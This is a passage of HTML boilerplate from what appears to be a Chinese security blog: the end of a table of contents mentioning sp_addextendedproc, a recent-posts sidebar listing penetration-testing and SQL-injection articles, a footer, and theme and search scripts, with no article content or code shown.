href="#sp-addextendedproc"><span class="toc-text">sp_addextendedproc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E8%84%9A%E6%9C%AC"><span class="toc-text">配合脚本</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/54905.html" title="内网渗透基于hash凭证抓取"><img src="/img/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透基于hash凭证抓取"/></a><div class="content"><a class="title" href="/posts/54905.html" title="内网渗透基于hash凭证抓取">内网渗透基于hash凭证抓取</a><time datetime="2023-10-24T04:32:05.000Z" title="发表于 2023-10-24 12:32:05">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/23017.html" title="SQL注入技术总结-Mssql"><img src="/img/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入技术总结-Mssql"/></a><div class="content"><a class="title" href="/posts/23017.html" title="SQL注入技术总结-Mssql">SQL注入技术总结-Mssql</a><time datetime="2023-10-24T03:23:58.000Z" title="发表于 2023-10-24 11:23:58">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/64193.html" title="SQL注入技术总结-Oracle"><img src="/img/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入技术总结-Oracle"/></a><div class="content"><a class="title" href="/posts/64193.html" title="SQL注入技术总结-Oracle">SQL注入技术总结-Oracle</a><time datetime="2023-10-24T03:21:34.000Z" title="发表于 2023-10-24 11:21:34">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/19435.html" title="SQL注入技术总结-MySql"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入技术总结-MySql"/></a><div class="content"><a class="title" href="/posts/19435.html" title="SQL注入技术总结-MySql">SQL注入技术总结-MySql</a><time datetime="2023-10-24T03:14:14.000Z" title="发表于 2023-10-24 11:14:14">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/27029.html" title="HTB-Authority（ESC1）"><img src="/img/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Authority（ESC1）"/></a><div class="content"><a class="title" href="/posts/27029.html" title="HTB-Authority（ESC1）">HTB-Authority（ESC1）</a><time datetime="2023-10-24T00:57:59.000Z" title="发表于 2023-10-24 08:57:59">2023-10-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/2.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Flyink</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div></body></html>